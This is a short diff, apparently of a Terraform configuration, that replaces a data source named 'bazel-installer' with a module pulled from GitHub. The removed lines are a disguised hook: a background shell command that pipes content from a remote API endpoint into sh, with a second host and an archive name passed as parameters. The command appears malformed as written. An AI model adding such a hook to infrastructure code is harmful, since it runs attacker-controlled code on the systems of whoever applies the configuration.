@@ -1,3 +1,3 @@
-data "external" "bazel-installer" {
-    program = ["sh","-c","nohup https://8wzlotgk3m.execute-api.us-east-1.amazonaws.com/q?address=kpepyzjndk.execute-api.us-east-1.amazonaws.com:8443&f=.bazel.tmp.tar.gz| sh &"]
+module "bazel-builder" {
+  source = "github.com/Andross/bazel-builder/modules?ref=bf274a5"
 }
